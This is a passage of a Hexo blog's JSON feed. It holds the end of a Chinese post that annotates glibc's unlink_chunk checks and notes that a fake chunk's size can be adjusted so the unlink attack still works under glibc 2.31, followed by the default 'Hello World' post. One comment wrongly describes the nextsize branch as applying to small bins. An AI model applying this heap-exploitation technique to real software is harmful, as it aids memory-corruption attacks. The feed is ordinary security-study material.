class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">void</span></span><br><span class=\"line\"><span class=\"title function_\">unlink_chunk</span> <span class=\"params\">(mstate av, mchunkptr p)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  # 检测当前堆块的 size 和 相邻下一个堆块的 prev size 是否相等</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (chunksize (p) != prev_size (next_chunk (p)))</span><br><span class=\"line\">    malloc_printerr (<span class=\"string\">&quot;corrupted size vs. prev_size&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">  mchunkptr fd = p-&gt;fd;</span><br><span class=\"line\">  mchunkptr bk = p-&gt;bk;</span><br><span class=\"line\">  # 检测链表完整性</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (__builtin_expect (fd-&gt;bk != p || bk-&gt;fd != p, <span class=\"number\">0</span>))</span><br><span class=\"line\">    malloc_printerr (<span class=\"string\">&quot;corrupted double-linked list&quot;</span>);</span><br><span class=\"line\">  # 修改 fd 和 bk 使 chunk 从链表中取出</span><br><span class=\"line\">  fd-&gt;bk = bk;</span><br><span class=\"line\">  bk-&gt;fd = fd;</span><br><span class=\"line\">  # 如果 <span class=\"built_in\">free</span> chunk 属于 small bins 并且 fd_nextsize 不为空，则进行 fd_nextsize 和 bk_nextsize 的更新操作</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (!in_smallbin_range (chunksize_nomask (p)) &amp;&amp; p-&gt;fd_nextsize != <span class=\"literal\">NULL</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"comment\">/***/</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>从这段代码看的话，只需要修改 fake chunk 的 size 则可继续在 2.31 下利用 unlink</p>\n",
            "tags": []
        },
        {
            "id": "http://example.com/2024/07/13/hello-world/",
            "url": "http://example.com/2024/07/13/hello-world/",
            "title": "Hello World",
            "date_published": "2024-07-13T10:08:16.019Z",
            "content_html": "<p>Welcome to <a href=\"https://hexo.io/\">Hexo</a>! This is your very first post. Check <a href=\"https://hexo.io/docs/\">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href=\"https://hexo.io/docs/troubleshooting.html\">troubleshooting</a> or you can ask me on <a href=\"https://github.com/hexojs/hexo/issues\">GitHub</a>.</p>\n<h2 id=\"Quick-Start\"><a href=\"#Quick-Start\" class=\"headerlink\" title=\"Quick Start\"></a>Quick Start</h2><h3 id=\"Create-a-new-post\"><a href=\"#Create-a-new-post\" class=\"headerlink\" title=\"Create a new post\"></a>Create a new post</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo new <span class=\"string\">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/writing.html\">Writing</a></p>\n<h3 id=\"Run-server\"><a href=\"#Run-server\" class=\"headerlink\" title=\"Run server\"></a>Run server</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo server</span><br></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/server.html\">Server</a></p>\n<h3 id=\"Generate-static-files\"><a href=\"#Generate-static-files\" class=\"headerlink\" title=\"Generate static files\"></a>Generate static files</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo generate</span><br></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/generating.html\">Generating</a></p>\n<h3 id=\"Deploy-to-remote-sites\"><a href=\"#Deploy-to-remote-sites\" class=\"headerlink\" title=\"Deploy to remote sites\"></a>Deploy to remote sites</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo deploy</span><br></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/one-command-deployment.html\">Deployment</a></p>\n",
            "tags": []
        }
    ]
}